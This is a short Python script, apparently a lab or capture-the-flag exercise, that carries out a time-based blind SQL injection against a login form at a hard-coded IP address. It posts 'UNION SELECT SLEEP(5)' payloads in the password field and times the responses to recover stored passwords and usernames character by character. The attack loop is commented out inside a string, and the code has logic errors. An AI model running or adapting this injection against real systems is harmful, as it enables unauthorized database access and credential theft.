import requests
import time

def column_name():
    dictionary = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
    columns_name=[]
    columns2_name=[]
    tab = ["id", "username", "password"]
    global table 
    table = ",1,2"
    a=0
    texte = ""
    texte2 = ""
    TIME = 5
    c=0
    d=0
    tab=""
    global r
    r = 0
    global s
    s = 0
    global t
    t = 0
    global u
    u = 0
    url = "http://51.15.136.118/pageid.php"
    for j in range (len(tab)):
        print(tab[j])

    """
    for i in range(1, 50):
        for j in range(0, len(dictionary)):
            if a > 31:
                if texte != "":
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    print(dictionary)
                    columns_name.append(texte)
                    texte = ""
                    a=0
                    tab = "Element avec id " + str(s) + " a comme mdp " + columns_name[c] +"."
                    print(tab)
                    c+=1
                    s = 0
                    break
                elif texte2 != "":
                    rm_letter = texte2[0]
                    dictionary.remove(rm_letter)
                    print(dictionary)
                    columns2_name.append(texte2)
                    texte2= ""
                    a=0
                    tab2 = "Element avec id " + str(u) + " a comme username " + columns2_name[d] +"."
                    print(tab2)
                    d+=1
                    u = 0
                    break
                else:
                    break

            for i in range(1,6):
                usr = "idc"
                start_time = time.time()
                passwd = "' UNION SELECT SLEEP(5)" + table + " id FROM users WHERE id = '" + str(i) + "' and password like '" + texte + dictionary[j] + "%' -- "
                response = requests.post(url, data={'username': usr, 'password': passwd})
                print(passwd)
                end_time = time.time()
                total_time = end_time - start_time
                r += 1
                if total_time >= TIME:
                    texte += dictionary[j]
                    print(texte)
                    s = r
                    i += 1
                    j = 0
                    a = 0
                    r = 0
                    break
            for i in range(1,6):
                usr = "idc"
                start_time = time.time()
                passwd = "' UNION SELECT SLEEP(5)" + table + " id FROM users WHERE id = '" + str(i) + "' and username like '" + texte2 + dictionary[j] + "%' -- "
                response = requests.post(url, data={'username': usr, 'password': passwd})
                print(passwd)
                end_time = time.time()
                total_time = end_time - start_time
                t += 1  
                if total_time >= TIME:
                    texte2 += dictionary[j]
                    print(texte2)
                    u = t
                    i += 1
                    j = 0
                    a = 0
                    t = 0
                    break
            a += 1"""


z = "nom_user_db"
zz = "users"
column_name()